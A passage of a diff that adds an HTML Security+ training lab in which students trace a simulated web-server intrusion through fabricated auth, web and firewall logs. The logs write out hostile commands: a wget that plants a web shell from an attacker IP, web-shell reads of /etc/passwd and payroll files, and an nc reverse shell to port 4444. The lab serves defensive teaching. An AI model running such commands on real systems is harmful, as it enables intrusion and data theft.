@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Platform auth guard: enforces enrollment before lab access -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/FirebaseAuth.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log Analysis: Find the Intrusion | Shield House</title>
+    <style>
+        /* ── Reset + design tokens ──────────────────────────────────── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #f87171;
+            --accent:  #f97316;
+            --bg:      #0a0a12;
+            --card:    rgba(15,15,25,0.92);
+            --text:    #e8e8f0;
+            --muted:   #888;
+            --border:  rgba(248,113,113,0.2);
+            --glow:    rgba(248,113,113,0.35);
+            --ok:      #10b981;
+            --err:     #ef4444;
+            --log-bg:  #08080f;
+            --log-text:#c8d8c8;
+            --hl-warn: rgba(249,115,22,0.18);
+            --hl-crit: rgba(239,68,68,0.18);
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+        }
+
+        /* ── Sticky header ──────────────────────────────────────────── */
+        .header {
+            padding: 14px 24px;
+            background: rgba(10,10,18,0.97);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header a { color: var(--muted); text-decoration: none; font-size: 0.9rem; }
+        .header a:hover { color: var(--primary); }
+        .badge {
+            font-size: 0.75rem;
+            padding: 4px 14px;
+            background: rgba(248,113,113,0.12);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            color: var(--primary);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        /* ── Page container ─────────────────────────────────────────── */
+        .container {
+            max-width: 1060px;
+            margin: 0 auto;
+            padding: 28px 18px 70px;
+        }
+
+        /* ── Lab title card ─────────────────────────────────────────── */
+        .lab-title {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 26px 24px;
+            background: linear-gradient(135deg, rgba(248,113,113,0.1), rgba(249,115,22,0.06));
+            border-radius: 14px;
+            border: 1px solid var(--border);
+        }
+        .lab-title h1 { font-size: 1.75rem; color: var(--primary); margin-bottom: 6px; }
+        .lab-title p  { color: var(--muted); font-size: 0.93rem; line-height: 1.6; max-width: 680px; margin: 0 auto; }
+
+        /* ── Scenario briefing ──────────────────────────────────────── */
+        .scenario {
+            background: rgba(249,115,22,0.07);
+            border-left: 4px solid var(--accent);
+            padding: 16px 20px;
+            border-radius: 0 10px 10px 0;
+            margin-bottom: 24px;
+            font-size: 0.92rem;
+            line-height: 1.7;
+            color: #ccc;
+        }
+        .scenario strong { color: var(--accent); }
+
+        /* ── Log viewer section ─────────────────────────────────────── */
+        .log-section {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            margin-bottom: 28px;
+            overflow: hidden;
+        }
+
+        /* Tab bar */
+        .tab-bar {
+            display: flex;
+            border-bottom: 1px solid var(--border);
+            background: rgba(10,10,18,0.7);
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            padding: 11px 20px;
+            background: transparent;
+            border: none;
+            color: var(--muted);
+            font-size: 0.88rem;
+            font-family: inherit;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: color 0.2s, border-color 0.2s;
+            letter-spacing: 0.04em;
+            white-space: nowrap;
+        }
+        .tab-btn:hover { color: var(--text); }
+        .tab-btn.active { color: var(--primary); border-bottom-color: var(--primary); }
+
+        /* Filter bar */
+        .filter-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--border);
+            background: rgba(10,10,18,0.5);
+        }
+        .filter-bar label { font-size: 0.82rem; color: var(--muted); white-space: nowrap; }
+        .filter-input {
+            flex: 1;
+            background: rgba(10,10,18,0.85);
+            border: 1px solid var(--border);
+            border-radius: 7px;
+            padding: 7px 12px;
+            color: var(--text);
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.84rem;
+        }
+        .filter-input:focus { outline: none; border-color: var(--primary); }
+        .filter-count { font-size: 0.78rem; color: var(--muted); white-space: nowrap; min-width: 64px; text-align: right; }
+        .clear-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--muted);
+            padding: 5px 10px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .clear-btn:hover { border-color: var(--primary); color: var(--primary); }
+
+        /* Log pane: fixed height, scrollable, no page overflow */
+        .log-pane {
+            height: 320px;
+            overflow-y: auto;
+            overflow-x: auto;
+            background: var(--log-bg);
+            padding: 12px 0;
+        }
+        .log-line {
+            display: block;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.78rem;
+            line-height: 1.55;
+            padding: 1px 16px;
+            white-space: pre;
+            color: var(--log-text);
+            transition: background 0.15s;
+        }
+        .log-line:hover { background: rgba(248,113,113,0.05); }
+        /* Highlight classes applied per line by data-tag attribute */
+        .log-line[data-tag="warn"] { background: var(--hl-warn); }
+        .log-line[data-tag="crit"] { background: var(--hl-crit); }
+        .log-line.hidden { display: none; }
+
+        /* Scrollbar styling for log pane */
+        .log-pane::-webkit-scrollbar { width: 7px; height: 7px; }
+        .log-pane::-webkit-scrollbar-track { background: rgba(10,10,18,0.5); }
+        .log-pane::-webkit-scrollbar-thumb { background: rgba(248,113,113,0.25); border-radius: 4px; }
+
+        /* Filter empty state */
+        .log-empty {
+            display: none;
+            padding: 24px;
+            text-align: center;
+            color: var(--muted);
+            font-size: 0.88rem;
+        }
+
+        /* ── Questions section ──────────────────────────────────────── */
+        .questions-heading {
+            font-size: 1.1rem;
+            color: var(--primary);
+            font-weight: 700;
+            margin-bottom: 14px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        /* Each question card */
+        .q-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 14px;
+            transition: border-color 0.3s;
+        }
+        .q-card.correct   { border-color: var(--ok); }
+        .q-card.incorrect { border-color: var(--err); }
+
+        .q-header {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            margin-bottom: 12px;
+        }
+        .q-num {
+            background: var(--primary);
+            color: #000;
+            min-width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.82rem;
+            flex-shrink: 0;
+        }
+        .q-text { font-size: 0.92rem; color: #ccc; line-height: 1.6; }
+
+        /* Hint: which log tab to check */
+        .q-hint {
+            font-size: 0.78rem;
+            color: var(--muted);
+            margin-bottom: 10px;
+            font-style: italic;
+        }
+
+        /* Dropdown answer */
+        .q-select select {
+            background: rgba(10,10,18,0.9);
+            color: var(--text);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 14px;
+            font-size: 0.88rem;
+            cursor: pointer;
+            min-width: 230px;
+            max-width: 100%;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+        .q-select select:focus { outline: none; border-color: var(--primary); }
+
+        /* Short text input for byte-count question */
+        .q-input input {
+            background: rgba(10,10,18,0.9);
+            color: var(--text);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 14px;
+            font-size: 0.88rem;
+            min-width: 200px;
+            max-width: 100%;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+        .q-input input:focus { outline: none; border-color: var(--primary); }
+
+        /* Per-question feedback */
+        .q-feedback {
+            font-size: 0.84rem;
+            margin-top: 9px;
+            display: none;
+            line-height: 1.55;
+        }
+        .q-feedback.show { display: block; }
+        .q-feedback.right { color: var(--ok); }
+        .q-feedback.wrong { color: var(--err); }
+
+        /* ── Action buttons ─────────────────────────────────────────── */
+        .actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 26px 0;
+            flex-wrap: wrap;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--primary);
+            color: #000;
+            border: none;
+            padding: 11px 26px;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #fb9a9a; box-shadow: 0 4px 16px var(--glow); }
+        .btn:disabled { opacity: 0.45; cursor: not-allowed; }
+        .btn-secondary {
+            background: transparent;
+            color: var(--primary);
+            border: 1px solid var(--primary);
+        }
+        .btn-secondary:hover { background: rgba(248,113,113,0.1); box-shadow: none; }
+
+        /* ── Score results panel ────────────────────────────────────── */
+        .results {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 24px;
+            margin: 18px 0;
+            text-align: center;
+        }
+        .results.show { display: block; }
+        .results h2 { color: var(--primary); margin-bottom: 10px; font-size: 1.4rem; }
+        .results p  { color: var(--muted); font-size: 0.93rem; line-height: 1.6; }
+
+        /* ── Mark Complete button section ───────────────────────────── */
+        .complete-section {
+            text-align: center;
+            margin-top: 22px;
+            display: none;
+        }
+        .complete-section.show { display: block; }
+
+        /* ── Mobile adjustments (360px minimum) ─────────────────────── */
+        @media (max-width: 600px) {
+            .lab-title h1 { font-size: 1.35rem; }
+            .log-pane     { height: 240px; }
+            .q-select select, .q-input input { min-width: 100%; }
+            .tab-btn { padding: 9px 13px; font-size: 0.82rem; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Visually-hidden landmark heading for screen readers -->
+<h2 style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">
+    Log Analysis: Find the Intrusion Lab
+</h2>
+
+<!-- ── Sticky page header ────────────────────────────────────────────── -->
+<header class="header">
+    <a href="../index.html">&larr; Back to Security+ Cert Prep</a>
+    <span class="badge">Shield House -- Security+</span>
+</header>
+
+<!-- ── Main content ──────────────────────────────────────────────────── -->
+<div class="container">
+
+    <!-- Lab title -->
+    <div class="lab-title">
+        <h1>Log Analysis: Find the Intrusion</h1>
+        <p>
+            A production web server shows signs of compromise. Use the three log datasets below
+            to reconstruct the attack chain, identify the threat actor, and answer the
+            investigative questions. Filter each log to zero in on events of interest.
+        </p>
+    </div>
+
+    <!-- Scenario briefing -->
+    <div class="scenario">
+        <strong>Incident Brief -- 2024-11-14</strong><br>
+        An alert fired at 03:47 UTC when an outbound connection to an unfamiliar external IP
+        transferred an unusually large payload. Your job: trace the attack from its earliest
+        reconnaissance phase through to exfiltration. The server hosts an internal HR portal
+        on Ubuntu 22.04 running Apache 2.4 and is accessible via SSH. Use the auth log,
+        web access log, and firewall log to answer the questions below.<br><br>
+        <strong>Tip:</strong> Use the filter box to search each log. Try searching for an IP,
+        username, status code, or keyword like "Accepted" or "POST". Each answer
+        corresponds to evidence visible in one or more logs.
+    </div>
+
+    <!-- ── Log Viewer ────────────────────────────────────────────────── -->
+    <div class="log-section">
+
+        <!-- Tab navigation: three log datasets -->
+        <div class="tab-bar" role="tablist">
+            <button class="tab-btn active" role="tab" aria-selected="true"
+                    onclick="switchTab('auth')" id="tab-auth">
+                auth.log (SSH / Login)
+            </button>
+            <button class="tab-btn" role="tab" aria-selected="false"
+                    onclick="switchTab('web')" id="tab-web">
+                access.log (Web)
+            </button>
+            <button class="tab-btn" role="tab" aria-selected="false"
+                    onclick="switchTab('fw')" id="tab-fw">
+                firewall.log (iptables)
+            </button>
+        </div>
+
+        <!-- Filter bar: one instance, shared across all tabs -->
+        <div class="filter-bar">
+            <label for="filterInput">Filter:</label>
+            <input type="text" id="filterInput" class="filter-input"
+                   placeholder="Type to filter visible lines..." autocomplete="off"
+                   oninput="applyFilter()">
+            <button class="clear-btn" onclick="clearFilter()">Clear</button>
+            <span class="filter-count" id="filterCount"></span>
+        </div>
+
+        <!-- Log pane: content is swapped when tabs switch -->
+        <div class="log-pane" id="logPane" role="log" aria-live="polite" aria-label="Log output"></div>
+        <div class="log-empty" id="logEmpty">No lines match the current filter.</div>
+    </div>
+
+    <!-- ── Investigative Questions ───────────────────────────────────── -->
+    <p class="questions-heading">Investigative Questions</p>
+    <p style="color:var(--muted);font-size:0.87rem;margin-bottom:18px;">
+        Answer each question using evidence from the logs above. Filter the logs to find
+        exact values -- all answers are directly visible in the log data.
+    </p>
+
+    <!-- Question cards are rendered here by JS -->
+    <div id="qCards"></div>
+
+    <!-- Grade + Reset buttons -->
+    <div class="actions">
+        <button class="btn" id="submitBtn" onclick="gradeAll()">Check Answers</button>
+        <button class="btn btn-secondary" onclick="resetLab()">Reset</button>
+    </div>
+
+    <!-- Score summary panel -->
+    <div class="results" id="results"></div>
+
+    <!-- Mark Complete: only shown when student scores >= 75% (6 of 8) -->
+    <div class="complete-section" id="completeSection">
+        <button class="btn" onclick="ModuleProgress.complete('shield','shield-log-intrusion-hunt',{returnUrl:'../index.html'})">
+            Mark Complete
+        </button>
+    </div>
+
+</div><!-- /.container -->
+
+<script>
+/* ================================================================
+   LOG DATA
+   Attack chain:
+     Attacker IP : 198.51.100.47
+     Target user  : jgarcia
+     SSH brute    : 2024-11-14 03:11 - 03:16 UTC (15 failed attempts against jgarcia)
+     Successful   : 2024-11-14 03:17:04 UTC
+     Web shell    : GET /hr/uploads/shell.php  (03:31:14 UTC, status 200)
+     Exfil path   : GET /hr/uploads/shell.php?cmd=... + large outbound
+                    Firewall sees 2024-11-14 03:43:22 → 198.51.100.47:4444 ALLOW BYTES=1048576 (LEN=1500 per-packet)
+     All IPs from RFC 5737 documentation ranges (198.51.100.x) or RFC 1918.
+     Server LAN IP: 10.0.1.22
+   ================================================================ */
+
+/* ── AUTH LOG (Linux sshd format, /var/log/auth.log style) ──────── */
+var AUTH_LOG = [
+    /* === Background noise: normal logins before the attack === */
+    {t:"warn", l:"Nov 14 02:44:01 webprod sshd[3801]: Accepted publickey for deploy from 10.0.1.5 port 52341 ssh2: RSA SHA256:abc123"},
+    {t:"",     l:"Nov 14 02:44:03 webprod sshd[3802]: pam_unix(sshd:session): session opened for user deploy by (uid=0)"},
+    {t:"",     l:"Nov 14 02:48:59 webprod sshd[3802]: pam_unix(sshd:session): session closed for user deploy"},
+    {t:"",     l:"Nov 14 02:55:12 webprod sshd[3811]: Accepted publickey for sysadmin from 10.0.1.10 port 48821 ssh2: RSA SHA256:def456"},
+    {t:"",     l:"Nov 14 02:55:14 webprod sshd[3812]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)"},
+    {t:"",     l:"Nov 14 03:02:47 webprod sshd[3812]: pam_unix(sshd:session): session closed for user sysadmin"},
+    /* === Brute force begins: rapid failures against jgarcia === */
+    {t:"crit", l:"Nov 14 03:11:04 webprod sshd[3901]: Failed password for jgarcia from 198.51.100.47 port 54321 ssh2"},
+    {t:"crit", l:"Nov 14 03:11:09 webprod sshd[3902]: Failed password for jgarcia from 198.51.100.47 port 54322 ssh2"},
+    {t:"crit", l:"Nov 14 03:11:15 webprod sshd[3903]: Failed password for jgarcia from 198.51.100.47 port 54323 ssh2"},
+    {t:"crit", l:"Nov 14 03:11:22 webprod sshd[3904]: Failed password for jgarcia from 198.51.100.47 port 54324 ssh2"},
+    {t:"crit", l:"Nov 14 03:11:30 webprod sshd[3905]: Failed password for jgarcia from 198.51.100.47 port 54325 ssh2"},
+    {t:"crit", l:"Nov 14 03:12:01 webprod sshd[3910]: Failed password for jgarcia from 198.51.100.47 port 54330 ssh2"},
+    {t:"crit", l:"Nov 14 03:12:14 webprod sshd[3911]: Failed password for jgarcia from 198.51.100.47 port 54331 ssh2"},
+    {t:"crit", l:"Nov 14 03:12:28 webprod sshd[3912]: Failed password for jgarcia from 198.51.100.47 port 54332 ssh2"},
+    {t:"crit", l:"Nov 14 03:13:01 webprod sshd[3920]: Failed password for invalid user admin from 198.51.100.47 port 54340 ssh2"},
+    {t:"crit", l:"Nov 14 03:13:18 webprod sshd[3921]: Failed password for invalid user root from 198.51.100.47 port 54341 ssh2"},
+    {t:"crit", l:"Nov 14 03:13:44 webprod sshd[3922]: Failed password for jgarcia from 198.51.100.47 port 54342 ssh2"},
+    {t:"crit", l:"Nov 14 03:14:02 webprod sshd[3930]: Failed password for jgarcia from 198.51.100.47 port 54350 ssh2"},
+    {t:"crit", l:"Nov 14 03:14:39 webprod sshd[3931]: Failed password for jgarcia from 198.51.100.47 port 54351 ssh2"},
+    {t:"crit", l:"Nov 14 03:15:05 webprod sshd[3932]: Failed password for jgarcia from 198.51.100.47 port 54352 ssh2"},
+    {t:"crit", l:"Nov 14 03:15:22 webprod sshd[3940]: Failed password for jgarcia from 198.51.100.47 port 54360 ssh2"},
+    {t:"crit", l:"Nov 14 03:15:50 webprod sshd[3941]: Failed password for jgarcia from 198.51.100.47 port 54361 ssh2"},
+    {t:"crit", l:"Nov 14 03:16:11 webprod sshd[3942]: Failed password for jgarcia from 198.51.100.47 port 54362 ssh2"},
+    /* === Successful login: attacker in === */
+    {t:"crit", l:"Nov 14 03:17:04 webprod sshd[3960]: Accepted password for jgarcia from 198.51.100.47 port 54370 ssh2"},
+    {t:"warn", l:"Nov 14 03:17:06 webprod sshd[3961]: pam_unix(sshd:session): session opened for user jgarcia by (uid=0)"},
+    /* === Attacker active: sudo escalation attempts === */
+    {t:"warn", l:"Nov 14 03:18:14 webprod sudo: jgarcia : TTY=pts/1 ; PWD=/home/jgarcia ; USER=root ; COMMAND=/usr/bin/id"},
+    {t:"warn", l:"Nov 14 03:19:02 webprod sudo: jgarcia : TTY=pts/1 ; PWD=/home/jgarcia ; USER=root ; COMMAND=/bin/ls /var/www/html/hr/uploads"},
+    {t:"warn", l:"Nov 14 03:19:45 webprod sudo: jgarcia : TTY=pts/1 ; PWD=/home/jgarcia ; USER=root ; COMMAND=/usr/bin/wget -O /var/www/html/hr/uploads/shell.php http://198.51.100.47/shell.php"},
+    /* === Attacker SSH session closes after web shell planted === */
+    {t:"",     l:"Nov 14 03:20:01 webprod sshd[3961]: pam_unix(sshd:session): session closed for user jgarcia"},
+    /* === Normal background logins after the incident window === */
+    {t:"",     l:"Nov 14 04:01:55 webprod sshd[4100]: Accepted publickey for deploy from 10.0.1.5 port 52399 ssh2: RSA SHA256:abc123"},
+    {t:"",     l:"Nov 14 04:02:00 webprod sshd[4101]: pam_unix(sshd:session): session opened for user deploy by (uid=0)"},
+    {t:"",     l:"Nov 14 04:09:33 webprod sshd[4101]: pam_unix(sshd:session): session closed for user deploy"}
+];
+
+/* ── WEB ACCESS LOG (Apache combined format) ─────────────────────── */
+/*  Format: IP - - [date:time zone] "METHOD path proto" status bytes "referer" "user-agent" */
+var WEB_LOG = [
+    /* === Normal background web traffic === */
+    {t:"",     l:'10.0.1.30 - - [14/Nov/2024:01:52:11 +0000] "GET /hr/index.html HTTP/1.1" 200 4120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.31 - - [14/Nov/2024:01:55:44 +0000] "GET /hr/assets/main.css HTTP/1.1" 200 9812 "http://10.0.1.22/hr/index.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.30 - - [14/Nov/2024:02:03:07 +0000] "POST /hr/login.php HTTP/1.1" 302 0 "http://10.0.1.22/hr/index.html" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.32 - - [14/Nov/2024:02:14:22 +0000] "GET /hr/employees.php HTTP/1.1" 200 18440 "http://10.0.1.22/hr/dashboard.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"'},
+    {t:"",     l:'10.0.1.30 - - [14/Nov/2024:02:22:51 +0000] "GET /hr/employees.php?export=csv HTTP/1.1" 200 57320 "http://10.0.1.22/hr/employees.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.31 - - [14/Nov/2024:02:31:09 +0000] "GET /hr/reports.php HTTP/1.1" 200 6230 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.33 - - [14/Nov/2024:02:44:37 +0000] "GET /hr/payroll.php HTTP/1.1" 200 14710 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    /* === Attacker recon: directory scanning from external IP === */
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:18 +0000] "GET /hr/ HTTP/1.1" 200 4120 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:21 +0000] "GET /hr/uploads/ HTTP/1.1" 403 294 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:24 +0000] "GET /hr/admin/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:27 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:30 +0000] "GET /phpinfo.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:33 +0000] "GET /hr/config.php.bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    {t:"warn", l:'198.51.100.47 - - [14/Nov/2024:03:05:36 +0000] "GET /hr/login.php HTTP/1.1" 200 2840 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"'},
+    /* === Normal mid-night low traffic === */
+    {t:"",     l:'10.0.1.30 - - [14/Nov/2024:03:08:44 +0000] "GET /hr/dashboard.php HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    /* === Web shell placed by attacker via wget over SSH session === */
+    /* === Web shell first execution: command injection via GET === */
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:31:14 +0000] "GET /hr/uploads/shell.php?cmd=id HTTP/1.1" 200 14 "-" "curl/7.88.1"'},
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:32:05 +0000] "GET /hr/uploads/shell.php?cmd=uname+-a HTTP/1.1" 200 89 "-" "curl/7.88.1"'},
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:33:02 +0000] "GET /hr/uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1842 "-" "curl/7.88.1"'},
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:34:48 +0000] "GET /hr/uploads/shell.php?cmd=find+/var/www/html/hr+-name+%22*.csv%22 HTTP/1.1" 200 312 "-" "curl/7.88.1"'},
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:36:21 +0000] "GET /hr/uploads/shell.php?cmd=cat+/var/www/html/hr/data/employees_full.csv HTTP/1.1" 200 204800 "-" "curl/7.88.1"'},
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:38:00 +0000] "GET /hr/uploads/shell.php?cmd=cat+/var/www/html/hr/data/payroll_q3_2024.csv HTTP/1.1" 200 311296 "-" "curl/7.88.1"'},
+    /* === Exfil via reverse connection (shell.php initiates outbound) === */
+    {t:"crit", l:'198.51.100.47 - - [14/Nov/2024:03:42:17 +0000] "GET /hr/uploads/shell.php?cmd=nc+-e+/bin/bash+198.51.100.47+4444 HTTP/1.1" 200 0 "-" "curl/7.88.1"'},
+    /* === Normal traffic resumes after attacker gone === */
+    {t:"",     l:'10.0.1.31 - - [14/Nov/2024:04:10:05 +0000] "GET /hr/index.html HTTP/1.1" 200 4120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.30 - - [14/Nov/2024:04:22:38 +0000] "POST /hr/login.php HTTP/1.1" 302 0 "http://10.0.1.22/hr/index.html" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"'},
+    {t:"",     l:'10.0.1.34 - - [14/Nov/2024:04:45:11 +0000] "GET /hr/employees.php HTTP/1.1" 200 18440 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"'}
+];
+
+/* ── FIREWALL LOG (iptables-style: timestamp src->dst dport action bytes) ── */
+/*  Simulated from iptables LOG target + custom logger                      */
+var FW_LOG = [
+    /* === Normal allowed inbound web traffic === */
+    {t:"",     l:"2024-11-14T01:52:11Z ALLOW IN=eth0 SRC=10.0.1.30 DST=10.0.1.22 PROTO=TCP SPT=49201 DPT=80 LEN=52"},
+    {t:"",     l:"2024-11-14T01:55:44Z ALLOW IN=eth0 SRC=10.0.1.31 DST=10.0.1.22 PROTO=TCP SPT=49204 DPT=80 LEN=52"},
+    {t:"",     l:"2024-11-14T02:03:07Z ALLOW IN=eth0 SRC=10.0.1.30 DST=10.0.1.22 PROTO=TCP SPT=49210 DPT=80 LEN=280"},
+    {t:"",     l:"2024-11-14T02:14:22Z ALLOW IN=eth0 SRC=10.0.1.32 DST=10.0.1.22 PROTO=TCP SPT=49230 DPT=80 LEN=52"},
+    /* === Normal inbound SSH from internal management range === */
+    {t:"",     l:"2024-11-14T02:44:01Z ALLOW IN=eth0 SRC=10.0.1.5 DST=10.0.1.22 PROTO=TCP SPT=52341 DPT=22 LEN=52"},
+    {t:"",     l:"2024-11-14T02:55:12Z ALLOW IN=eth0 SRC=10.0.1.10 DST=10.0.1.22 PROTO=TCP SPT=48821 DPT=22 LEN=52"},
+    /* === Firewall allows attacker web recon (port 80 is open to internet) === */
+    {t:"warn", l:"2024-11-14T03:05:18Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=60100 DPT=80 LEN=52"},
+    {t:"warn", l:"2024-11-14T03:05:21Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=60101 DPT=80 LEN=52"},
+    /* === Firewall ALLOWS attacker SSH because no geo-block rule exists === */
+    {t:"warn", l:"2024-11-14T03:10:58Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54320 DPT=22 LEN=52"},
+    /* === Attacker brute-force SSH connections (firewall allows, sshd rejects auth) === */
+    {t:"crit", l:"2024-11-14T03:11:04Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54321 DPT=22 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:11:09Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54322 DPT=22 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:11:15Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54323 DPT=22 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:12:01Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54330 DPT=22 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:14:02Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54350 DPT=22 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:16:11Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=54362 DPT=22 LEN=52"},
+    /* === Web shell access allowed inbound (port 80 remains open) === */
+    {t:"crit", l:"2024-11-14T03:31:14Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=61200 DPT=80 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:33:02Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=61201 DPT=80 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:36:21Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=61202 DPT=80 LEN=52"},
+    {t:"crit", l:"2024-11-14T03:38:00Z ALLOW IN=eth0 SRC=198.51.100.47 DST=10.0.1.22 PROTO=TCP SPT=61203 DPT=80 LEN=52"},
+    /* === CRITICAL: outbound exfil — server connects OUT to attacker on port 4444 ===
+         This is the reverse shell initiated by nc in the web shell command.
+         Firewall has no egress rule blocking non-standard outbound ports.         */
+    {t:"crit", l:"2024-11-14T03:43:22Z ALLOW OUT=eth0 SRC=10.0.1.22 DST=198.51.100.47 PROTO=TCP SPT=38100 DPT=4444 LEN=1500 BYTES=1048576"},
+    /* === Normal allowed outbound DNS / NTP (background) === */
+    {t:"",     l:"2024-11-14T03:50:00Z ALLOW OUT=eth0 SRC=10.0.1.22 DST=8.8.8.8 PROTO=UDP SPT=32768 DPT=53 LEN=64"},
